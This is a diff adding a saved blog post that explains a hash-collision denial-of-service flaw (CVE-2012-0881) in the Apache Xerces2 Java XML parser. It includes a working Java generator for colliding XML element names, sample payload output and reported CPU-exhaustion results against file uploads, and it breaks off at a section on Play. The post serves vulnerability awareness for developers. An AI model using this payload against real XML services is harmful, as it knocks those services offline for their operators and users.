@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="en-gb">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <title>Coerced to make Xerces think | Tales about Software Engineering</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1">
+    <meta name="generator" content="Hugo 0.73.0" />
+    
+    
+      <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+    
+
+    
+    
+      <link href="/dist/css/app.4fc0b62e4b82c997bb0041217cd6b979.css" rel="stylesheet">
+    
+
+    
+
+    
+      
+
+    
+
+    
+    
+    <meta property="og:title" content="Coerced to make Xerces think" />
+<meta property="og:description" content="More and more I&rsquo;m thinking that XML is evil! This is the third part of my series on why, as a software engineer, it is very useful to think about the potentially dangerous combination of outdated libraries and XML.
+I recently carried out a review of the dependency scanning results CVE-2012-0881:
+ Apache Xerces2 Java allows remote attackers to cause a denial of service (CPU consumption) via a crafted message to an XML service, which triggers hash table collisions." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://beny23.github.io/posts/coerced_to_make_xerces_think/" />
+<meta property="article:published_time" content="2018-08-03T23:45:26+01:00" />
+<meta property="article:modified_time" content="2018-08-03T23:45:26+01:00" />
+<meta itemprop="name" content="Coerced to make Xerces think">
+<meta itemprop="description" content="More and more I&rsquo;m thinking that XML is evil! This is the third part of my series on why, as a software engineer, it is very useful to think about the potentially dangerous combination of outdated libraries and XML.
+I recently carried out a review of the dependency scanning results CVE-2012-0881:
+ Apache Xerces2 Java allows remote attackers to cause a denial of service (CPU consumption) via a crafted message to an XML service, which triggers hash table collisions.">
+<meta itemprop="datePublished" content="2018-08-03T23:45:26&#43;01:00" />
+<meta itemprop="dateModified" content="2018-08-03T23:45:26&#43;01:00" />
+<meta itemprop="wordCount" content="1211">
+
+
+
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Coerced to make Xerces think"/>
+<meta name="twitter:description" content="More and more I&rsquo;m thinking that XML is evil! This is the third part of my series on why, as a software engineer, it is very useful to think about the potentially dangerous combination of outdated libraries and XML.
+I recently carried out a review of the dependency scanning results CVE-2012-0881:
+ Apache Xerces2 Java allows remote attackers to cause a denial of service (CPU consumption) via a crafted message to an XML service, which triggers hash table collisions."/>
+
+	
+  </head>
+
+  <body class="ma0 avenir bg-near-white">
+
+    
+   
+  
+
+  <header>
+    <div class="bg-black">
+      <nav class="pv3 ph3 ph4-ns" role="navigation">
+  <div class="flex-l justify-between items-center center">
+    <a href="/" class="f3 fw2 hover-white no-underline white-90 dib">
+      
+        Tales about Software Engineering
+      
+    </a>
+    <div class="flex-l items-center">
+      
+
+      
+        <ul class="pl0 mr3">
+          
+          <li class="list f5 f4-ns fw4 dib pr3">
+            <a class="hover-white no-underline white-90" href="/about/" title="About page">
+              About
+            </a>
+          </li>
+          
+          <li class="list f5 f4-ns fw4 dib pr3">
+            <a class="hover-white no-underline white-90" href="/posts/" title="Blog page">
+              Blog
+            </a>
+          </li>
+          
+        </ul>
+      
+      
+
+
+<a href="https://stackoverflow.com/users/227140/beny23" target="_blank" class="link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="Stack Overflow link" rel="noopener" aria-label="follow on Stack Overflow——Opens in a new window">
+  <svg height="32px" 
+    style="enable-background:new 0 0 67 67;"
+    xmlns="http://www.w3.org/2000/svg"
+    viewBox="0 0 24 24"
+    width="32px"
+>
+    <path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm.869 5.903l3.114 4.567-.975.665-3.115-4.567.976-.665zm-2.812 2.585l4.84 2.838-.6 1.017-4.842-2.838.602-1.017zm-1.276 2.724l5.413 1.521-.291 1.077-5.428-1.458.306-1.14zm-.588 2.461l5.687.569-.103 1.12-5.691-.513.107-1.176zm-.169 2.16h5.835v1.167h-5.835v-1.167zm7.976 3.167h-10v-6h1v5h8v-5h1v6zm.195-8.602l-.945-5.446 1.162-.202.947 5.446-1.164.202z"/>
+</svg>
+
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000" width="8px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:;"/>
+</svg>
+</span></a>
+
+
+
+
+
+
+<a href="https://www.linkedin.com/in/gerald-benischke-9811b663" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window">
+  <svg  height="32px"  style="enable-background:new 0 0 65 65;" version="1.1" viewBox="0 0 65 65" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <path d="M50.837,48.137V36.425c0-6.275-3.35-9.195-7.816-9.195  c-3.604,0-5.219,1.983-6.119,3.374V27.71h-6.79c0.09,1.917,0,20.427,0,20.427h6.79V36.729c0-0.609,0.044-1.219,0.224-1.655  c0.49-1.22,1.607-2.483,3.482-2.483c2.458,0,3.44,1.873,3.44,4.618v10.929H50.837z M22.959,24.922c2.367,0,3.842-1.57,3.842-3.531  c-0.044-2.003-1.475-3.528-3.797-3.528s-3.841,1.524-3.841,3.528c0,1.961,1.474,3.531,3.753,3.531H22.959z M34,64  C17.432,64,4,50.568,4,34C4,17.431,17.432,4,34,4s30,13.431,30,30C64,50.568,50.568,64,34,64z M26.354,48.137V27.71h-6.789v20.427  H26.354z" style="fill-rule:evenodd;clip-rule:evenodd;fill:;"/>
+</svg>
+
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000" width="8px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:;"/>
+</svg>
+</span></a>
+
+
+
+
+
+
+
+
+
+    </div>
+  </div>
+</nav>
+
+    </div>
+  </header>
+
+
+
+    <main class="pb7" role="main">
+      
+  
+  <article class="flex-l flex-wrap justify-between mw8 center ph3">
+    <header class="mt4 w-100">
+      <aside class="instapaper_ignoref b helvetica tracked">
+          
+        POSTS
+      </aside>
+      
+
+
+
+
+  <div id="sharing" class="mt3">
+
+    
+    <a href="https://www.facebook.com/sharer.php?u=https://beny23.github.io/posts/coerced_to_make_xerces_think/" class="facebook no-underline" aria-label="share on Facebook">
+      <svg height="32px"  style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765,50.32h6.744V33.998h4.499l0.596-5.624h-5.095  l0.007-2.816c0-1.466,0.14-2.253,2.244-2.253h2.812V17.68h-4.5c-5.405,0-7.307,2.729-7.307,7.317v3.377h-3.369v5.625h3.369V50.32z   M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;"/></svg>
+
+    </a>
+
+    
+    
+    <a href="https://twitter.com/share?url=https://beny23.github.io/posts/coerced_to_make_xerces_think/&amp;text=Coerced%20to%20make%20Xerces%20think" class="twitter no-underline" aria-label="share on Twitter">
+      <svg height="32px"  style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:;"/></svg>
+
+    </a>
+
+    
+    <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://beny23.github.io/posts/coerced_to_make_xerces_think/&amp;title=Coerced%20to%20make%20Xerces%20think" class="linkedin no-underline" aria-label="share on LinkedIn">
+      <svg  height="32px"  style="enable-background:new 0 0 65 65;" version="1.1" viewBox="0 0 65 65" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <path d="M50.837,48.137V36.425c0-6.275-3.35-9.195-7.816-9.195  c-3.604,0-5.219,1.983-6.119,3.374V27.71h-6.79c0.09,1.917,0,20.427,0,20.427h6.79V36.729c0-0.609,0.044-1.219,0.224-1.655  c0.49-1.22,1.607-2.483,3.482-2.483c2.458,0,3.44,1.873,3.44,4.618v10.929H50.837z M22.959,24.922c2.367,0,3.842-1.57,3.842-3.531  c-0.044-2.003-1.475-3.528-3.797-3.528s-3.841,1.524-3.841,3.528c0,1.961,1.474,3.531,3.753,3.531H22.959z M34,64  C17.432,64,4,50.568,4,34C4,17.431,17.432,4,34,4s30,13.431,30,30C64,50.568,50.568,64,34,64z M26.354,48.137V27.71h-6.789v20.427  H26.354z" style="fill-rule:evenodd;clip-rule:evenodd;fill:;"/>
+</svg>
+
+    </a>
+  </div>
+
+
+      <h1 class="f1 athelas mt3 mb1">Coerced to make Xerces think</h1>
+      
+      
+      <time class="f6 mv4 dib tracked" datetime="2018-08-03T23:45:26&#43;01:00">August 3, 2018</time>
+
+      
+      
+        <span class="f6 mv4 dib tracked"> - 6 minutes read</span>
+        <span class="f6 mv4 dib tracked"> - 1211 words</span>
+      
+    </header>
+    <div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img mid-gray pr4-l w-two-thirds-l"><p><img src="/images/coerced_to_make_xerces_think_title.png" alt=""></p>
+<p><a href="https://beny23.github.io/posts/laughing_out_loud_malicious_auth/">More</a> and <a href="https://beny23.github.io/posts/hiding_xxe_in_spreadsheets/">more</a>
+I&rsquo;m thinking that XML is evil! This is the third part of my series on why, as a software engineer, it is very useful
+to think about the potentially dangerous combination of outdated libraries and XML.</p>
+<p>I recently carried out a review of the dependency scanning results </p>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-0881">CVE-2012-0881</a>:</p>
+<blockquote>
+<p>Apache Xerces2 Java allows remote attackers to cause a denial of service (CPU consumption) via a crafted message to
+an XML service, which triggers hash table collisions.</p>
+</blockquote>
+<p>Now, I had come across this previously but wasn&rsquo;t able to find much information about how to create this crafted
+message until talking with talking with members of the <a href="https://www.equalexperts.com/services/security/">Equal Experts security practice</a> 
+led me to find the following two articles:</p>
+<ul>
+<li><a href="https://events.ccc.de/congress/2011/Fahrplan/attachments/2007_28C3_Effective_DoS_on_web_application_platforms.pdf">https://events.ccc.de/congress/2011/Fahrplan/attachments/2007_28C3_Effective_DoS_on_web_application_platforms.pdf</a></li>
+<li><a href="https://stackoverflow.com/q/8669946/227140">https://stackoverflow.com/q/8669946/227140</a></li>
+</ul>
+<p>That was all the info I needed!</p>
+<h1 id="whats-a-hash-collision">Whats a hash collision?</h1>
+<p>Simply put, a hash collision is when two different Strings have the same hashcode.  For strings, hash codes are
+generated using the following method (Java 8):</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-java" data-lang="java"><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">int</span> <span style="color:#50fa7b">hashCode</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">{</span>
+    <span style="color:#8be9fd">int</span> h <span style="color:#ff79c6">=</span> hash<span style="color:#ff79c6">;</span>
+    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>h <span style="color:#ff79c6">==</span> 0 <span style="color:#ff79c6">&amp;&amp;</span> value<span style="color:#ff79c6">.</span><span style="color:#50fa7b">length</span> <span style="color:#ff79c6">&gt;</span> 0<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+        <span style="color:#8be9fd">char</span> val<span style="color:#ff79c6">[]</span> <span style="color:#ff79c6">=</span> value<span style="color:#ff79c6">;</span>
+
+        <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> 0<span style="color:#ff79c6">;</span> i <span style="color:#ff79c6">&lt;</span> value<span style="color:#ff79c6">.</span><span style="color:#50fa7b">length</span><span style="color:#ff79c6">;</span> i<span style="color:#ff79c6">++)</span> <span style="color:#ff79c6">{</span>
+            h <span style="color:#ff79c6">=</span> 31 <span style="color:#ff79c6">*</span> h <span style="color:#ff79c6">+</span> val<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">];</span>
+        <span style="color:#ff79c6">}</span>
+        hash <span style="color:#ff79c6">=</span> h<span style="color:#ff79c6">;</span>
+    <span style="color:#ff79c6">}</span>
+    <span style="color:#ff79c6">return</span> h<span style="color:#ff79c6">;</span>
+<span style="color:#ff79c6">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>So a long (or short string) is reduced to an integer value.  HashMaps and HashSets use those integer values to organise
+the data structure.</p>
+<h1 id="why-are-hash-collisions-bad">Why are hash collisions bad?</h1>
+<p>If strings have the same hash code, then a HashMap will store it under the same key in a list.  This means that
+HashMaps are only efficient if the hash codes are sufficiently different. </p>
+<h1 id="how-does-this-affect-xml-parsing">How does this affect XML parsing?</h1>
+<p>Xerces stores &ldquo;symbols&rdquo; (i.e. XML elements, attributes, etc) in a SymbolTable
+(<a href="https://svn.apache.org/repos/asf/xerces/java/tags/Xerces-J_2_11_0/src/org/apache/xerces/util/SymbolTable.java">https://svn.apache.org/repos/asf/xerces/java/tags/Xerces-J_2_11_0/src/org/apache/xerces/util/SymbolTable.java</a>) -
+which essentially is a HashMap.</p>
+<p>The CCC article describes how forcing a HashMap implementation to deal with collisions can lead to the CPU being spiked
+for quite a while, which makes such things the ideal candidate for Denial of Service attacks.</p>
+<h1 id="the-attack">The attack</h1>
+<p>Once I was armed with the knowledge about what hash collisions were and how they could be exploited, I set about creating
+a malicious XML file. I used the information from the stackoverflow article to create a little piece of code to create my malicious file</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-java" data-lang="java"><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">...</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> IOException <span style="color:#ff79c6">{</span>
+    List<span style="color:#ff79c6">&lt;</span>String<span style="color:#ff79c6">&gt;</span> results <span style="color:#ff79c6">=</span> permute<span style="color:#ff79c6">(</span>Arrays<span style="color:#ff79c6">.</span><span style="color:#50fa7b">asList</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Aa&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;BB&#34;</span><span style="color:#ff79c6">),</span> 3<span style="color:#ff79c6">);</span>
+    <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">(</span>PrintWriter out <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> PrintWriter<span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> FileWriter<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;test_collision.xml&#34;</span><span style="color:#ff79c6">)))</span> <span style="color:#ff79c6">{</span>
+        <span style="color:#8be9fd">int</span> limit <span style="color:#ff79c6">=</span> 1400 <span style="color:#ff79c6">*</span> 1024 <span style="color:#ff79c6">/</span> format<span style="color:#ff79c6">(</span>results<span style="color:#ff79c6">.</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span>0<span style="color:#ff79c6">)).</span><span style="color:#50fa7b">length</span><span style="color:#ff79c6">();</span>
+        System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Creating a file with &#34;</span> <span style="color:#ff79c6">+</span> results<span style="color:#ff79c6">.</span><span style="color:#50fa7b">size</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34; entries, limiting to &#34;</span> <span style="color:#ff79c6">+</span> limit<span style="color:#ff79c6">);</span>
+        out<span style="color:#ff79c6">.</span><span style="color:#50fa7b">print</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;&lt;root&gt;&#34;</span><span style="color:#ff79c6">);</span>
+        results<span style="color:#ff79c6">.</span><span style="color:#50fa7b">stream</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">limit</span><span style="color:#ff79c6">(</span>limit<span style="color:#ff79c6">).</span><span style="color:#50fa7b">forEach</span><span style="color:#ff79c6">(</span>e <span style="color:#ff79c6">-&gt;</span> out<span style="color:#ff79c6">.</span><span style="color:#50fa7b">print</span><span style="color:#ff79c6">(</span>format<span style="color:#ff79c6">(</span>e<span style="color:#ff79c6">)));</span>
+        out<span style="color:#ff79c6">.</span><span style="color:#50fa7b">print</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;&lt;/root&gt;&#34;</span><span style="color:#ff79c6">);</span>
+    <span style="color:#ff79c6">}</span>
+<span style="color:#ff79c6">}</span>
+
+<span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">static</span> String <span style="color:#50fa7b">format</span><span style="color:#ff79c6">(</span>String s<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+    <span style="color:#ff79c6">return</span> String<span style="color:#ff79c6">.</span><span style="color:#50fa7b">format</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;&lt;%s/&gt;&#34;</span><span style="color:#ff79c6">,</span> s<span style="color:#ff79c6">);</span>
+<span style="color:#ff79c6">}</span>
+
+<span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">static</span> List<span style="color:#ff79c6">&lt;</span>String<span style="color:#ff79c6">&gt;</span> <span style="color:#50fa7b">permute</span><span style="color:#ff79c6">(</span>List<span style="color:#ff79c6">&lt;</span>String<span style="color:#ff79c6">&gt;</span> strings<span style="color:#ff79c6">,</span> <span style="color:#8be9fd">int</span> iter<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+    List<span style="color:#ff79c6">&lt;</span>String<span style="color:#ff79c6">&gt;</span> result <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ArrayList<span style="color:#ff79c6">&lt;&gt;(</span>strings<span style="color:#ff79c6">.</span><span style="color:#50fa7b">size</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">*</span> strings<span style="color:#ff79c6">.</span><span style="color:#50fa7b">size</span><span style="color:#ff79c6">());</span>
+    <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">(</span>String i <span style="color:#ff79c6">:</span> strings<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+        <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">(</span>String j <span style="color:#ff79c6">:</span> strings<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+            result<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span>i <span style="color:#ff79c6">+</span> j<span style="color:#ff79c6">);</span>
+        <span style="color:#ff79c6">}</span>
+    <span style="color:#ff79c6">}</span>
+    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>iter <span style="color:#ff79c6">==</span> 0<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+        <span style="color:#ff79c6">return</span> result<span style="color:#ff79c6">;</span>
+    <span style="color:#ff79c6">}</span>
+    <span style="color:#ff79c6">return</span> permute<span style="color:#ff79c6">(</span>result<span style="color:#ff79c6">,</span> iter <span style="color:#ff79c6">-</span> 1<span style="color:#ff79c6">);</span>
+<span style="color:#ff79c6">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>this creates an XML file which looks like this</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-xml" data-lang="xml"><span style="color:#ff79c6">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<span style="color:#ff79c6">&lt;root&gt;</span>
+  <span style="color:#ff79c6">&lt;AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAa/&gt;</span>
+  <span style="color:#ff79c6">&lt;AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaBB/&gt;</span>
+  <span style="color:#ff79c6">&lt;AaAaAaAaAaAaAaAaAaAaAaAaAaAaBBAa/&gt;</span>
+  <span style="color:#ff79c6">&lt;AaAaAaAaAaAaAaAaAaAaAaAaAaAaBBBB/&gt;</span>
+  <span style="color:#ff79c6">&lt;AaAaAaAaAaAaAaAaAaAaAaAaAaBBAaAa/&gt;</span>
+  <span style="color:#ff79c6">&lt;AaAaAaAaAaAaAaAaAaAaAaAaAaBBAaBB/&gt;</span>
+  <span style="color:#ff79c6">&lt;AaAaAaAaAaAaAaAaAaAaAaAaAaBBBBAa/&gt;</span>
+  ...
+<span style="color:#ff79c6">&lt;/root&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Each of the element names have got the same hashcode!</p>
+<h1 id="attacking-file-uploads">Attacking File Uploads</h1>
+<p>I found that anything that processed XML payloads (and was using Xerces 2.11.0) was vulnerable. By uploading as little
+as 5 files with a size of 2MB each simultaneously, I was able to cause a CPU load of 100% for up-to about a minute.
+Sustain this enough and it might cause a rather inconvenient Denial of Service probably without being caught by the
+traditional DDoS protections&hellip;</p>
+<p>Now, finding applications that allow file uploads isn&rsquo;t that frequent, so how bad could it be?</p>
+<h1 id="attacking-play">Attacking Play</h1>
+<p>I have been working with Play 2.5 a fair bit recently and found that it too was using Xerces 2.11.0</p>
